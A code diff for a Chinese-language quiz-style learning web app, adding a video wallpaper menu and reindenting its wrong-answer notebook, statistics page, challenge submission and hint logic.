+    { id: 'bg-video-1', name: '双马尾', overlay: 'linear-gradient(135deg, rgba(17, 24, 39, 0.4) 0%, rgba(31, 41, 55, 0.3) 100%)' },
+    { id: 'bg-video-2', name: '动漫少女', overlay: 'linear-gradient(135deg, rgba(236, 72, 153, 0.4) 0%, rgba(139, 92, 246, 0.4) 100%)' },
+    { id: 'bg-video-3', name: '光影美女', overlay: 'linear-gradient(135deg, rgba(251, 146, 60, 0.4) 0%, rgba(234, 88, 12, 0.4) 100%)' },
+    { id: 'bg-video-4', name: '古风美女', overlay: 'linear-gradient(135deg, rgba(220, 38, 38, 0.4) 0%, rgba(153, 27, 27, 0.4) 100%)' },
+    { id: 'none', name: '关闭', overlay: 'none' }
+];
+
+// 切换壁纸菜单
+function toggleWallpaperMenu() {
+    wallpaperMenuOpen = !wallpaperMenuOpen;
+    const options = document.getElementById('wallpaper-options');
+    const btn = document.getElementById('wallpaper-btn');
+
+    if (wallpaperMenuOpen) {
+        options.classList.remove('spinning');
+        options.classList.add('open');
+        btn.classList.add('open');
+        updateActiveButton();
+        // 展开动画结束后开始持续旋转
+        setTimeout(() => {
+            if (wallpaperMenuOpen) {
+                options.classList.add('spinning');
+            }
+        }, 800);
+    } else {
+        options.classList.remove('open');
+        options.classList.remove('spinning');
+        btn.classList.remove('open');
+    }
+}
+
+// 选择壁纸
+function selectWallpaper(index) {
+    currentVideoIndex = index;
+    updateVideoBg();
+    updateActiveButton();
+    // 延迟关闭菜单
+    setTimeout(() => {
+        toggleWallpaperMenu();
+    }, 300);
+}
+
+// 更新选中按钮状态
+function updateActiveButton() {
+    document.querySelectorAll('.wallpaper-option button').forEach((btn, i) => {
+        btn.classList.toggle('active', i === currentVideoIndex);
+    });
+}
+
+// 更新视频背景显示
+function updateVideoBg() {
+    const overlay = document.getElementById('video-overlay');
+    const current = VIDEO_LIST[currentVideoIndex];
+
+    // 隐藏所有视频
+    for (let i = 0; i < VIDEO_LIST.length - 1; i++) {
+        const video = document.getElementById(`bg-video-${i}`);
+        if (video) {
+            video.style.display = 'none';
+            video.pause();
+        }
+    }
+
+    if (current.id === 'none') {
+        // 关闭背景
+        overlay.style.display = 'none';
+    } else {
+        // 显示选中的视频
+        const video = document.getElementById(current.id);
+        if (video) {
+            video.style.display = 'block';
+            video.play();
+        }
+        overlay.style.display = 'block';
+        overlay.style.background = current.overlay;
+    }
+}
+
+// 点击其他地方关闭菜单
+document.addEventListener('click', (e) => {
+    const menu = document.getElementById('wallpaper-menu');
+    if (wallpaperMenuOpen && menu && !menu.contains(e.target)) {
+        toggleWallpaperMenu();
+    }
+});
+
+// 错题本页面
+function renderWrongBook() {
+    const wrongChallenges = GAME_DATA.challenges.filter(c => gameState.wrongAnswers.has(c.id));
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -6028,8 +6034,8 @@ for i in range(3):
                             <p class="text-gray-400 text-center mb-8">这些是你答错过的题目，点击重新练习</p>
                             <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
                                 ${wrongChallenges.map(challenge => {
-                                    const index = GAME_DATA.challenges.findIndex(c => c.id === challenge.id);
-                                    return `
+        const index = GAME_DATA.challenges.findIndex(c => c.id === challenge.id);
+        return `
                                         <div class="glass-card rounded-xl p-5 card-hover cursor-pointer border-l-4 border-red-500"
                                              onclick="startChallenge(${index})">
                                             <div class="flex justify-between items-start mb-3">
@@ -6040,7 +6046,7 @@ for i in range(3):
                                             <div class="flex gap-1">${Array(challenge.difficulty).fill('⭐').join('')}</div>
                                         </div>
                                     `;
-                                }).join('')}
+    }).join('')}
                             </div>
                             <div class="text-center mt-8">
                                 <button onclick="clearWrongBook()" class="px-6 py-3 bg-red-600 text-white rounded-lg hover:bg-red-500 transition">
@@ -6051,26 +6057,26 @@ for i in range(3):
                     </div>
                 </div>
             `;
-        }
-        
-        function clearWrongBook() {
-            if (confirm('确定要清空错题本吗？')) {
-                gameState.wrongAnswers.clear();
-                saveProgress();
-                render();
-            }
-        }
-        
-        // 学习统计页面
-        function renderStats() {
-            const accuracy = gameState.totalAttempts > 0 
-                ? Math.round(gameState.correctAttempts / gameState.totalAttempts * 100) 
-                : 0;
-            const avgXP = gameState.completedChallenges.size > 0
-                ? Math.round(gameState.totalXP / gameState.completedChallenges.size)
-                : 0;
-                
-            return `
+}
+
+function clearWrongBook() {
+    if (confirm('确定要清空错题本吗？')) {
+        gameState.wrongAnswers.clear();
+        saveProgress();
+        render();
+    }
+}
+
+// 学习统计页面
+function renderStats() {
+    const accuracy = gameState.totalAttempts > 0
+        ? Math.round(gameState.correctAttempts / gameState.totalAttempts * 100)
+        : 0;
+    const avgXP = gameState.completedChallenges.size > 0
+        ? Math.round(gameState.totalXP / gameState.completedChallenges.size)
+        : 0;
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center gap-4">
                         <button onclick="navigateTo('home')" class="text-white hover:text-purple-400 transition">← 返回</button>
@@ -6149,105 +6155,105 @@ for i in range(3):
                     </div>
                 </div>
             `;
-        }
-        
-        // 随机挑战
-        function startRandomChallenge() {
-            const uncompletedChallenges = GAME_DATA.challenges.filter(c => !gameState.completedChallenges.has(c.id));
-            const pool = uncompletedChallenges.length > 0 ? uncompletedChallenges : GAME_DATA.challenges;
-            const randomChallenge = pool[Math.floor(Math.random() * pool.length)];
-            const index = GAME_DATA.challenges.findIndex(c => c.id === randomChallenge.id);
-            startChallenge(index);
-        }
-        
-        function renderRandomChallenge() {
-            return renderChallengePlay();
-        }
+}
 
-        // ============== 事件处理 ==============
-        function navigateTo(page) {
-            gameState.currentPage = page;
-            render();
-        }
+// 随机挑战
+function startRandomChallenge() {
+    const uncompletedChallenges = GAME_DATA.challenges.filter(c => !gameState.completedChallenges.has(c.id));
+    const pool = uncompletedChallenges.length > 0 ? uncompletedChallenges : GAME_DATA.challenges;
+    const randomChallenge = pool[Math.floor(Math.random() * pool.length)];
+    const index = GAME_DATA.challenges.findIndex(c => c.id === randomChallenge.id);
+    startChallenge(index);
+}
 
-        function selectCategory(index) {
-            gameState.selectedCategory = index;
-            gameState.currentCardIndex = 0;
-            gameState.currentPage = 'cardDetail';
-            render();
-        }
+function renderRandomChallenge() {
+    return renderChallengePlay();
+}
 
-        function flipCard(cardId) {
-            playFlipSound();
-            if (!gameState.flippedCards.has(cardId)) {
-                gameState.flippedCards.add(cardId);
-                saveProgress();
-                checkAchievements();
+// ============== 事件处理 ==============
+function navigateTo(page) {
+    gameState.currentPage = page;
+    render();
+}
+
+function selectCategory(index) {
+    gameState.selectedCategory = index;
+    gameState.currentCardIndex = 0;
+    gameState.currentPage = 'cardDetail';
+    render();
+}
+
+function flipCard(cardId) {
+    playFlipSound();
+    if (!gameState.flippedCards.has(cardId)) {
+        gameState.flippedCards.add(cardId);
+        saveProgress();
+        checkAchievements();
+    }
+    render();
+}
+
+function prevCard() {
+    if (gameState.currentCardIndex > 0) {
+        gameState.currentCardIndex--;
+        render();
+    }
+}
+
+function nextCard() {
+    const category = GAME_DATA.knowledgeCards[gameState.selectedCategory];
+    if (gameState.currentCardIndex < category.cards.length - 1) {
+        gameState.currentCardIndex++;
+        render();
+    }
+}
+
+function startChallenge(index) {
+    gameState.currentChallengeIndex = index;
+    gameState.currentPage = 'challengePlay';
+    gameState.hintCount = 0;  // 重置提示计数
+    render();
+}
+
+function submitAnswer() {
+    const input = document.getElementById('answer-input');
+    const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
+    const userAnswer = input.value.trim();
+
+    const modal = document.getElementById('result-modal');
+    const content = document.getElementById('result-content');
+
+    // 记录答题次数
+    gameState.totalAttempts++;
+
+    if (userAnswer.toLowerCase() === challenge.answer.toLowerCase()) {
+        // 正确
+        gameState.correctAttempts++;
+
+        if (!gameState.completedChallenges.has(challenge.id)) {
+            gameState.completedChallenges.add(challenge.id);
+            gameState.totalXP += challenge.xp;
+            gameState.streak++;
+            gameState.todayCompleted++;
+
+            // 更新最高连胜
+            if (gameState.streak > gameState.maxStreak) {
+                gameState.maxStreak = gameState.streak;
             }
-            render();
+
+            // 如果之前错过，从错题本移除
+            gameState.wrongAnswers.delete(challenge.id);
+
+            saveProgress();
+            checkAchievements();
         }
 
-        function prevCard() {
-            if (gameState.currentCardIndex > 0) {
-                gameState.currentCardIndex--;
-                render();
-            }
-        }
+        playSuccessSound();
 
-        function nextCard() {
-            const category = GAME_DATA.knowledgeCards[gameState.selectedCategory];
-            if (gameState.currentCardIndex < category.cards.length - 1) {
-                gameState.currentCardIndex++;
-                render();
-            }
-        }
+        const hasNextChallenge = gameState.currentChallengeIndex < GAME_DATA.challenges.length - 1;
+        const accuracy = Math.round(gameState.correctAttempts / gameState.totalAttempts * 100);
 
-        function startChallenge(index) {
-            gameState.currentChallengeIndex = index;
-            gameState.currentPage = 'challengePlay';
-            gameState.hintCount = 0;  // 重置提示计数
-            render();
-        }
-
-        function submitAnswer() {
-            const input = document.getElementById('answer-input');
-            const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
-            const userAnswer = input.value.trim();
-            
-            const modal = document.getElementById('result-modal');
-            const content = document.getElementById('result-content');
-            
-            // 记录答题次数
-            gameState.totalAttempts++;
-            
-            if (userAnswer.toLowerCase() === challenge.answer.toLowerCase()) {
-                // 正确
-                gameState.correctAttempts++;
-                
-                if (!gameState.completedChallenges.has(challenge.id)) {
-                    gameState.completedChallenges.add(challenge.id);
-                    gameState.totalXP += challenge.xp;
-                    gameState.streak++;
-                    gameState.todayCompleted++;
-                    
-                    // 更新最高连胜
-                    if (gameState.streak > gameState.maxStreak) {
-                        gameState.maxStreak = gameState.streak;
-                    }
-                    
-                    // 如果之前错过，从错题本移除
-                    gameState.wrongAnswers.delete(challenge.id);
-                    
-                    saveProgress();
-                    checkAchievements();
-                }
-                
-                playSuccessSound();
-                
-                const hasNextChallenge = gameState.currentChallengeIndex < GAME_DATA.challenges.length - 1;
-                const accuracy = Math.round(gameState.correctAttempts / gameState.totalAttempts * 100);
-                
-                content.innerHTML = `
+        content.innerHTML = `
                     <div class="text-6xl mb-4">🎉</div>
                     <h3 class="text-2xl font-bold text-green-400 mb-2">答对了！</h3>
                     <p class="text-gray-300 mb-2">+${challenge.xp} 经验值</p>
@@ -6268,14 +6274,14 @@ for i in range(3):
                         `}
                     </div>
                 `;
-            } else {
-                // 错误 - 加入错题本
-                gameState.streak = 0;
-                gameState.wrongAnswers.add(challenge.id);
-                saveProgress();
-                
-                playErrorSound();
-                content.innerHTML = `
+    } else {
+        // 错误 - 加入错题本
+        gameState.streak = 0;
+        gameState.wrongAnswers.add(challenge.id);
+        saveProgress();
+
+        playErrorSound();
+        content.innerHTML = `
                     <div class="text-6xl mb-4">😅</div>
                     <h3 class="text-2xl font-bold text-red-400 mb-2">再想想...</h3>
                     <p class="text-gray-400 mb-4">提示：${challenge.hint}</p>
@@ -6284,92 +6290,92 @@ for i in range(3):
                         再试一次
                     </button>
                 `;
-            }
-            
-            modal.classList.remove('hidden');
-        }
+    }
 
-        function closeModal() {
-            document.getElementById('result-modal').classList.add('hidden');
-            render();  // 留在当前页面，可以继续看解释
-        }
-        
-        function tryAgain() {
-            // 只关闭弹窗，清空输入框，让用户继续答题
-            document.getElementById('result-modal').classList.add('hidden');
-            const input = document.getElementById('answer-input');
-            if (input) {
-                input.value = '';
-                input.focus();  // 自动聚焦到输入框
-            }
-        }
-        
-        function goNextChallenge() {
-            document.getElementById('result-modal').classList.add('hidden');
-            playClickSound();
-            if (gameState.currentChallengeIndex < GAME_DATA.challenges.length - 1) {
-                gameState.currentChallengeIndex++;
-                render();
-            }
-        }
+    modal.classList.remove('hidden');
+}
 
-        function showHint() {
-            const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
-            gameState.hintCount++;
-            
-            if (gameState.hintCount >= 3) {
-                // 第三次点击，显示答案
-                alert('🎁 答案揭晓！\n\n正确答案是：' + challenge.answer + '\n\n📝 ' + challenge.explanation.split('\\n')[0]);
-                // 自动填入答案
-                const input = document.getElementById('answer-input');
-                if (input) {
-                    input.value = challenge.answer;
-                    input.focus();
-                }
-            } else if (gameState.hintCount === 2) {
-                // 第二次点击，给更多提示
-                const firstChar = challenge.answer[0];
-                alert('💡 提示 2/3：\n\n' + challenge.hint + '\n\n🔤 答案的第一个字符是："' + firstChar + '"\n\n再点一次就告诉你答案啦！');
-            } else {
-                // 第一次点击
-                alert('💡 提示 1/3：\n\n' + challenge.hint + '\n\n👉 再点两次提示可以查看答案');
-            }
-        }
+function closeModal() {
+    document.getElementById('result-modal').classList.add('hidden');
+    render();  // 留在当前页面，可以继续看解释
+}
 
-        function bindEvents() {
-            // 键盘事件
-            document.onkeydown = (e) => {
-                if (gameState.currentPage === 'cardDetail') {
-                    if (e.key === 'ArrowLeft') prevCard();
-                    if (e.key === 'ArrowRight') nextCard();
-                    if (e.key === ' ') {
-                        const category = GAME_DATA.knowledgeCards[gameState.selectedCategory];
-                        const cardId = `${category.category}-${gameState.currentCardIndex}`;
-                        flipCard(cardId);
-                    }
-                }
-                if (gameState.currentPage === 'challengePlay' && e.key === 'Enter') {
-                    const modal = document.getElementById('result-modal');
-                    // 如果弹窗显示中，按回车进入下一关
-                    if (modal && !modal.classList.contains('hidden')) {
-                        const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
-                        if (gameState.completedChallenges.has(challenge.id)) {
-                            if (gameState.currentChallengeIndex < GAME_DATA.challenges.length - 1) {
-                                goNextChallenge();
-                            } else {
-                                closeModal();
-                            }
-                        } else {
-                            closeModal();
-                        }
-                    } else {
-                        // 弹窗未显示，正常提交
-                        submitAnswer();
-                    }
-                }
-            };
-        }
+function tryAgain() {
+    // 只关闭弹窗，清空输入框，让用户继续答题
+    document.getElementById('result-modal').classList.add('hidden');
+    const input = document.getElementById('answer-input');
+    if (input) {
+        input.value = '';
+        input.focus();  // 自动聚焦到输入框
+    }
+}
 
-        // ============== 初始化 ==============
-        loadProgress();
+function goNextChallenge() {
+    document.getElementById('result-modal').classList.add('hidden');
+    playClickSound();
+    if (gameState.currentChallengeIndex < GAME_DATA.challenges.length - 1) {
+        gameState.currentChallengeIndex++;
         render();
+    }
+}
+
+function showHint() {
+    const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
+    gameState.hintCount++;
+
+    if (gameState.hintCount >= 3) {
+        // 第三次点击，显示答案
+        alert('🎁 答案揭晓！\n\n正确答案是：' + challenge.answer + '\n\n📝 ' + challenge.explanation.split('\\n')[0]);
+        // 自动填入答案
+        const input = document.getElementById('answer-input');
+        if (input) {
+            input.value = challenge.answer;
+            input.focus();
+        }
+    } else if (gameState.hintCount === 2) {
+        // 第二次点击，给更多提示
+        const firstChar = challenge.answer[0];
+        alert('💡 提示 2/3：\n\n' + challenge.hint + '\n\n🔤 答案的第一个字符是："' + firstChar + '"\n\n再点一次就告诉你答案啦！');
+    } else {
+        // 第一次点击
+        alert('💡 提示 1/3：\n\n' + challenge.hint + '\n\n👉 再点两次提示可以查看答案');
+    }
+}
+
+function bindEvents() {
+    // 键盘事件
+    document.onkeydown = (e) => {
+        if (gameState.currentPage === 'cardDetail') {
+            if (e.key === 'ArrowLeft') prevCard();
+            if (e.key === 'ArrowRight') nextCard();
+            if (e.key === ' ') {
+                const category = GAME_DATA.knowledgeCards[gameState.selectedCategory];
+                const cardId = `${category.category}-${gameState.currentCardIndex}`;
+                flipCard(cardId);
+            }
+        }
+        if (gameState.currentPage === 'challengePlay' && e.key === 'Enter') {
+            const modal = document.getElementById('result-modal');
+            // 如果弹窗显示中，按回车进入下一关
+            if (modal && !modal.classList.contains('hidden')) {
+                const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
+                if (gameState.completedChallenges.has(challenge.id)) {
+                    if (gameState.currentChallengeIndex < GAME_DATA.challenges.length - 1) {
+                        goNextChallenge();
+                    } else {
+                        closeModal();
+                    }
+                } else {
+                    closeModal();
+                }
+            } else {
+                // 弹窗未显示，正常提交
+                submitAnswer();
+            }
+        }
+    };
+}
+
+// ============== 初始化 ==============
+loadProgress();
+render();
